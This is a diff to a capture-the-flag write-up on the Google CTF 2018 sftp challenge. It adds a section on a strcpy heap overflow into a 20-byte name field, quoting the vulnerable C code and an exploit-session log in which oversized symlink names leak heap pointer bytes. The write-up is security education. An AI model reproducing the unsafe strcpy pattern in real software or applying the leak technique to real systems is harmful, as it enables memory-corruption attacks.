@@ -1694,7 +1694,7 @@ p.interactive()
 
 ## Bonus: Off-By-One From Hell
 
-I mentioned that I found two "extra" bugs not one. The other one is simply a usability bug which matters little, apart from driving me crazy for a while. Long story short, when you invoke the `pwd` command, you always get the same exact result: "/home". This gave me fits at first as I struggled to comprehend what was actually happening. In the end, after a needlessly long time debugging the code, I realized that there is basically an off-by-one in the implementation that results in creating the pwd like this: "/home\00/path1(etc)". This of course just prints as "home" every time.
+I mentioned that I found a couple "extra" bugs not one. Another one is simply a usability bug which matters little, apart from driving me crazy for a while. Long story short, when you invoke the `pwd` command, you always get the same exact result: "/home". This gave me fits at first as I struggled to comprehend what was actually happening. In the end, after a needlessly long time debugging the code, I realized that there is basically an off-by-one in the implementation that results in creating the pwd like this: "/home\00/path1(etc)". This of course just prints as "home" every time.
 
 Honestly, I have no idea why the challenge author did this, but if it was on purpose, it was one hell of an annoying trick to pull, bro!
 
@@ -1717,4 +1717,88 @@ void entry_path(entry* ptr, char* path) {
   }
   memmove(path, path_ptr, strlen(path_ptr));
 }
+```
+
+## Bonus 2: Strcpy Is Always A Good Idea
+
+There is in fact one more vulnerability in the code which we could exploit under normal ptmalloc. Maybe I should have writen an exploit for this one too... nah.
+
+As it turns out, the way the program accepts names for new files/directories/links leads to a buffer overflow. This is because the path is copied into the entry object's 20 byte long array like so:
+
+```c
+entry** new_entry(char* path) {
+
+  char path_copy[path_max]; //4096 - the original input limited to that also
+  char* name = NULL;
+  strcpy(path_copy, path);
+  path = path_copy;
+  name = strrchr(path, '/'); //find the last part of the path provided - so 4096 max
+
+  (...)
+  *child = malloc(sizeof(entry));
+  (*child)->parent_directory = parent;
+  (*child)->type = INVALID_ENTRY;
+  strcpy((*child)->name, name); //4096 into 20 does not go
+```
+
+Of course, with ptmalloc, we can get a heap overflow of significance. For example if we aligned a new file entry object to get the slot in front of an already existing one or a directory entry, then we could be corrupting pointers. But nevermind that, we know that we from a flexible heap overflow like this, we can also get an exploit out of tcache metadata corruption itself to begin with. So that would be fairly run of the mill.
+
+Unfortunately - as far as I could see - this bug doesn't speed things up for the CTF version. That is because 1) heap overflows into other chunks aren't useful without overlaps on this sophisticated allocator of course 2) unfortunately the remaining fields of a file/directory/link entry are initialized AFTER the `strcpy` call, which means that we lose whatever we "gain" by writing into a file's size field or data pointer field or a link's target field or a directory's child array fields.
+
+Well - not entirely. In the case of directory and file entries, the name will be followed by a field that will not contain anything unknown but will definitely include a null byte. However, in the case of link entries, the entry structure is followed by the pointer to the new entry directly!
+
+```c
+struct link_entry {
+
+  struct entry entry;
+  struct entry* target;
+
+};
+```
+
+This means that if we can fill up the name fully, then we can actually get the value of a link pointer leaked out! As discussed before, this wouldn't help speeding up collisions, but it would make it possible to get the exact state of the `rand()` and therefore precisely predict which allocation falls to which address. From there we could have then written an exploit that never fails.
+
+Here's an example run showing that we get something useful for a link name overwrite, but not for file overwrites. Notice how the leaked byte for the name is just the size of the data provided but for the link it is an actual address:
+
+```
+kutyacica@ubuntu:~/Desktop/GCTF18$ python expl.py 
+[+] Starting local process './sftp_orig': pid 27567
+The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
+(...)
+sftp> 
+[*] Switching to interactive mode
+$ put a
+$ 1
+$ 
+sftp> $ help
+Available commands:
+(...)
+symlink oldpath newpath            Symlink remote file
+sftp> $ symlink a foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+sftp> $ ls
+flag
+src
+a
+fooooooooooooooooooo\x8c\x8e-Z
+sftp> $ put ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
+$ 4
+$ aaaa
+sftp> Invalid command.
+sftp> $ ls
+flag
+src
+a
+fooooooooooooooooooo\x8c\x8e-Z
+cccccccccccccccccccc\x04
+sftp> $ put BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+$ 3
+$ aaa
+sftp> Invalid command.
+sftp> $ ls
+flag
+src
+a
+fooooooooooooooooooo\x8c\x8e-Z
+cccccccccccccccccccc\x04
+BBBBBBBBBBBBBBBBBBBB\x03
 ```
